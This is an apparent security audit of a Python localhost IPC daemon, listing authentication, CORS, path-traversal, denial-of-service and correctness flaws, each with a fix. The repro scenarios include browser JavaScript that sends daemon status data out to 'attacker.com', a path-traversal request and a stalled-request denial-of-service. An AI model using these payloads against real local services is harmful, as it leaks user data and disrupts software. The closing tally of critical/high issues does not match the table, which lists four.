# Adversarial Security & Correctness Audit: Memory OS IPC Daemon

This report presents the findings of a security and correctness audit of [src/memory_os/core/daemon.py](file:///Users/oleksii/Documents/sandbox/memory_os/src/memory_os/core/daemon.py) which implements the localhost HTTP IPC server and the transcript-watcher background loop.

---

## Findings Summary

| Finding ID | Title | Severity | Impact |
| :--- | :--- | :--- | :--- |
| **SEC-01** | Zero Authentication & Wildcard CORS (`*`) on Localhost IPC Server | **Critical** | Remote cross-origin control & info leakage |
| **SEC-02** | Path Traversal / Arbitrary File Access via Unvalidated Space Switching | **High** | Write/read arbitrary files outside workspace |
| **SEC-03** | Denial of Service (DoS) via Single-Threaded Blocking Request Reads | **High** | Entire daemon IPC hangs indefinitely |
| **COR-01** | Transcript Ingestion Bypass upon Log File Truncation | **High** | Silent failure to ingest new memories |
| **COR-02** | Stale Cursor Clobbering & Duplicate Ingestion in Parallel Daemons | **Medium** | Corrupted memory history and LLM resource waste |
| **SEC-04** | Stack Trace and Local File Path Disclosure in HTTP Responses | **Medium** | Information leak of host username and file paths |
| **COR-03** | Performance I/O Thrashing via Excessive Disk Writes | **Low** | Unnecessary write wear and CPU cycles |

---

## Detailed Findings

### SEC-01: Zero Authentication & Wildcard CORS (`*`) on Localhost IPC Server

#### Location
- [src/memory_os/core/daemon.py:24-114](file:///Users/oleksii/Documents/sandbox/memory_os/src/memory_os/core/daemon.py#L24-L114) (Handler functions `do_GET`, `do_POST`, `do_OPTIONS`)

#### Severity
- **Critical**

#### Description & Exploit/Repro Scenario
The localhost HTTP IPC server (default port `22467`) does not implement any authentication or shared-secret verification. Furthermore, it explicitly sets the CORS header `Access-Control-Allow-Origin: *` on all endpoints (`/status`, `/auditors/status`, `/sync`, `/stop`, `/auditors/start`, etc.). 

Because binding to loopback (`127.0.0.1`) only prevents external network connections, it does not stop other local processes or web browser tabs from making requests. By setting `Access-Control-Allow-Origin: *` without verifying a secret token or validating the request source, any malicious website a user visits can perform Cross-Origin Resource Sharing (CORS) queries and Cross-Site Request Forgery (CSRF) actions to control the local system.

**Repro Scenario:**
1. A developer runs `memory_os` locally with the background daemon active on port `22467`.
2. The developer visits `http://attacker.com` in their web browser.
3. The attacker page runs the following background script:
   ```javascript
   // 1. Exfiltrate the developer's exact workspace paths, database paths, and log paths
   fetch('http://127.0.0.1:22467/status')
     .then(r => r.json())
     .then(data => {
         navigator.sendBeacon('http://attacker.com/leak', JSON.stringify(data));
     });

   // 2. Terminate the developer's local daemon
   fetch('http://127.0.0.1:22467/stop', { method: 'POST' });
   ```
4. The attacker successfully steals the user's local directory path structure, OS username, and stops the daemon.

#### Suggested Fix
1. Remove all `Access-Control-Allow-Origin: *` headers, or restrict the CORS headers to verify that the request originates from a trusted local origin (if a frontend UI is loaded from a specific trusted origin).
2. Generate a random shared-secret authentication token (e.g., stored in `data/.daemon_token`) when the daemon starts, and require clients to provide this token in an `Authorization: Bearer <token>` header on every request.

---

### SEC-02: Path Traversal / Arbitrary File Access via Unvalidated Space Switching

#### Location
- [src/memory_os/core/daemon.py:92-101](file:///Users/oleksii/Documents/sandbox/memory_os/src/memory_os/core/daemon.py#L92-L101) (POST `/space` parser)
- [src/memory_os/core/daemon.py:206-209](file:///Users/oleksii/Documents/sandbox/memory_os/src/memory_os/core/daemon.py#L206-L209) (`switch_space` function)

#### Severity
- **High**

#### Description & Exploit/Repro Scenario
The `POST /space` endpoint allows changing the configuration space dynamically. During initial setup, `MemoryOSConfig` validates the space slug using `validate_safe_id`. However, `switch_space` modifies `self.config.space` directly:
```python
def switch_space(self, new_space: str):
    self.config.space = new_space
```
Because `space` is a normal writable instance attribute on `MemoryOSConfig` and not a property with a setter, this assignment completely bypasses validation. 

If `space` is set to a path traversal string (e.g. `../../../../../../tmp`), then properties of `MemoryOSConfig` such as `self.config.db_path` and `self.config.capsules_file` (which are resolved using `self.memory_dir / ...`) resolve to locations outside the workspace root, as `(base / self.space).resolve()` is not constrained by `confine_to_root`.

**Failure/Exploit Scenario:**
1. A web browser page sends:
   ```http
   POST /space HTTP/1.1
   Host: 127.0.0.1:22467
   Content-Length: 30

   {"space": "../../../../../../tmp"}
   ```
2. The daemon changes its space configuration to `../../../../../../tmp` without validation.
3. The background thread schedules `db_optimize` (which runs `sqlite3.connect(str(self.config.db_path))` and executes `VACUUM`/`ANALYZE`) or runs `auto_compact` (which writes to `capsules_file`).
4. The daemon writes files and databases directly into `/tmp` (or other locations the user has write permissions to), bypassing workspace containment checks.

#### Suggested Fix
Re-run validation inside `switch_space` or refactor `MemoryOSConfig.space` into a Python `@property` with a setter that performs validation:
```python
# In src/memory_os/core/daemon.py
def switch_space(self, new_space: str):
    from memory_os.core.safe_id import validate_safe_id
    self.config.space = validate_safe_id(new_space, "space")
```

---

### SEC-03: Denial of Service (DoS) via Single-Threaded Blocking Request Reads

#### Location
- [src/memory_os/core/daemon.py:93-95](file:///Users/oleksii/Documents/sandbox/memory_os/src/memory_os/core/daemon.py#L93-L95) (`content_length` body read)
- [src/memory_os/core/daemon.py:226-241](file:///Users/oleksii/Documents/sandbox/memory_os/src/memory_os/core/daemon.py#L226-L241) (`start_ipc_server`)

#### Severity
- **High**

#### Description & Exploit/Repro Scenario
The `http.server.HTTPServer` is strictly single-threaded. When the `/space` endpoint receives a POST request, it reads the body synchronously using `self.rfile.read(content_length)` without a timeout. 

There are no socket timeouts configured on the HTTP server, and there is no limit on `Content-Length`. If a request specifies a large `Content-Length` but fails to transmit the data (or transmits it slowly), the thread hangs indefinitely on `self.rfile.read()`, blocking the single thread of the IPC server. Consequently, the CLI tools cannot status, sync, or stop the daemon, and it becomes completely unresponsive.

**Repro Scenario:**
1. A malicious tab (or local script) opens a TCP connection to the daemon and sends:
   ```http
   POST /space HTTP/1.1
   Host: 127.0.0.1:22467
   Content-Length: 999999
   ```
2. The sender stops transmitting any more bytes but leaves the socket open.
3. The daemon enters `self.rfile.read(999999)` and blocks.
4. Running `python3 -m memory_os daemon status` or any other IPC request hangs indefinitely.

#### Suggested Fix
1. Set a maximum size threshold (e.g., 10MB) for `Content-Length` and reject requests exceeding it with HTTP 413.
2. Configure a connection socket timeout (e.g., 5 seconds) on the socket.
3. Subclass `socketserver.ThreadingMixIn` to process each request on its own background thread:
   ```python
   from socketserver import ThreadingMixIn
   class ThreadingHTTPServer(ThreadingMixIn, http.server.HTTPServer):
       daemon_threads = True
   ```

---

### COR-01: Transcript Ingestion Bypass upon Log File Truncation

#### Location
- [src/memory_os/core/daemon.py:341-344](file:///Users/oleksii/Documents/sandbox/memory_os/src/memory_os/core/daemon.py#L341-L344) (in `check_file`)

#### Severity
- **High**

#### Description & Concrete Failure Scenario
In the file-watching loop, `check_file` detects if the transcript log file has grown. If the file has been truncated, rotated, or cleared (which is typical when resetting workspaces or starting fresh session cycles), `new_line_count` falls below the in-memory cursor `self._transcript_cursor`.
However, the logic handles this case by returning immediately without updating the cursor:
```python
new_line_count = self._count_lines()
if new_line_count <= self._transcript_cursor:
    self._last_change_time = 0.0
    return
```
Because the cursor is not updated or reset, it remains stuck at the old higher line count. The daemon will silently fail to ingest any new lines written to the transcript log until the new file size/line count surpasses the old cursor value.

**Failure Scenario:**
1. `transcript.jsonl` currently has 400 lines. The daemon processes it, setting `self._transcript_cursor = 400`.
2. The user or IDE truncates the file to 0 lines to start a clean session (`echo "" > transcript.jsonl`).
3. The user performs actions that write 15 new lines to `transcript.jsonl`.
4. The daemon runs `check_file`. `new_line_count` is 15.
5. The check `15 <= 400` evaluates to `True`. The method exits early and does not trigger ingestion.
6. The new 15 tasks are never ingested.

#### Suggested Fix
Reset the cursor if the file is truncated or smaller than the current cursor:
```python
new_line_count = self._count_lines()
if new_line_count < self._transcript_cursor:
    self.logger.info("Transcript file truncated. Resetting cursor.")
    self._transcript_cursor = new_line_count
    self._last_change_time = 0.0
    return
elif new_line_count == self._transcript_cursor:
    self._last_change_time = 0.0
    return
```

---

### COR-02: Stale Cursor Clobbering & Duplicate Ingestion in Parallel Daemons

#### Location
- [src/memory_os/core/daemon.py:156](file:///Users/oleksii/Documents/sandbox/memory_os/src/memory_os/core/daemon.py#L156) (`__init__`)
- [src/memory_os/core/daemon.py:234-241](file:///Users/oleksii/Documents/sandbox/memory_os/src/memory_os/core/daemon.py#L234-L241) (`start_ipc_server` try-except block)
- [src/memory_os/core/daemon.py:453](file:///Users/oleksii/Documents/sandbox/memory_os/src/memory_os/core/daemon.py#L453) (Main loop update)

#### Severity
- **Medium**

#### Description & Concrete Failure Scenario
1. **Binding Failures Ignored:** When `start_ipc_server` encounters an exception (e.g., port `22467` is already in use because another daemon instance is running), it logs the error but does not stop execution of the daemon. The process continues to run its background watch and compaction loops.
2. **Stale In-Memory Cursor:** The line cursor (`self._transcript_cursor`) is loaded from `daemon_status.json` only during initialization (`__init__`). It is never re-read during runtime checks.
3. **Clobbering State on Disk:** Every second, the daemon executes `self.write_status()`, which fetches the status dictionary, updates the `transcript_cursor` with its own in-memory value, and writes it to `daemon_status.json`.

**Failure Scenario:**
1. Daemon A is running normally.
2. The user runs `python -m memory_os _run_daemon_blocking ...` directly.
3. Daemon B starts up. It fails to bind to port 22467 but continues execution.
4. Daemon B loads a stale `transcript_cursor = 0` from disk.
5. In its main loop tick (every 1 second), Daemon B reads `daemon_status.json`, updates `transcript_cursor` to its stale `0` value, and overwrites `daemon_status.json`.
6. When new log lines are written, Daemon B checks the log file, sees `new_line_count = 10`, finds it is greater than its in-memory `0`, and triggers a duplicate ingestion.
7. Both daemons process the same logs, appending duplicates to `task_capsules.jsonl` and consuming duplicate LLM API tokens.

#### Suggested Fix
1. If `start_ipc_server` fails to bind, raise the exception or shut down the daemon immediately:
   ```python
   except Exception as e:
       self.logger.critical(f"Failed to start IPC Server: {e}")
       self.is_running = False
       raise e
   ```
2. Implement file locking (using `fcntl.flock` on Unix or another locking mechanism) on the PID file to guarantee that only one instance of the daemon runs in a given project root.

---

### SEC-04: Stack Trace and Local File Path Disclosure in HTTP Responses

#### Location
- [src/memory_os/core/daemon.py:28](file:///Users/oleksii/Documents/sandbox/memory_os/src/memory_os/core/daemon.py#L28) / [65](file:///Users/oleksii/Documents/sandbox/memory_os/src/memory_os/core/daemon.py#L65) (Unwrapped handler routes)
- [src/memory_os/core/daemon.py:103](file:///Users/oleksii/Documents/sandbox/memory_os/src/memory_os/core/daemon.py#L103) (Exception serializer)

#### Severity
- **Medium**

#### Description & Exploit/Repro Scenario
The request routes inside `DaemonHttpHandler` are not wrapped in global `try...except` blocks. If any exception is raised during status reading or parsing (e.g. database access errors, file encoding conflicts, or missing parameters), the python server framework generates an HTML traceback and returns it in the HTTP response body. 

In addition, the `/space` endpoint explicitly writes `json.dumps({"error": str(e)})`. If a filesystem error occurs, `str(e)` contains the full local absolute path of the files involved. Because CORS is set to `*`, any script on any website can read this response and exfiltrate the local directory structure, including the developer's system username.

**Failure Scenario:**
1. A website queries:
   ```javascript
   fetch('http://127.0.0.1:22467/space', { method: 'POST', body: '{"space": "invalid/path"}' })
     .then(r => r.json())
     .then(d => console.log(d.error));
   ```
2. The response returns an error message like:
   `[Errno 2] No such file or directory: '/Users/oleksii/Documents/sandbox/memory_os/data/daemon_status.json'`
3. The script exfiltrates the user's home folder path `/Users/oleksii/` to the attacker server.

#### Suggested Fix
Wrap the entire bodies of `do_GET` and `do_POST` in `try...except` blocks that catch all exceptions, log the error details locally to `daemon.log`, and return a generic error message (e.g. `{"error": "Internal Server Error"}`) with an HTTP 500 status.

---

### COR-03: Performance I/O Thrashing via Excessive Disk Writes

#### Location
- [src/memory_os/core/daemon.py:453](file:///Users/oleksii/Documents/sandbox/memory_os/src/memory_os/core/daemon.py#L453) (Main loop)

#### Severity
- **Low**

#### Description & Concrete Failure Scenario
Inside the main execution loop:
```python
while self.is_running:
    self.scheduler.run_pending(self.logger)
    time.sleep(1.0)
    self.write_status()
```
The daemon writes `daemon_status.json` to the filesystem every single second. This causes continuous disk writes, causing high I/O cycles and wasting system resources.

#### Suggested Fix
Only call `write_status()` when the daemon status actually changes (e.g., when a sync starts, completes, errors, or when a space is switched), rather than periodically on every loop tick.

---

## Verdict

7 issues found (3 critical/high)
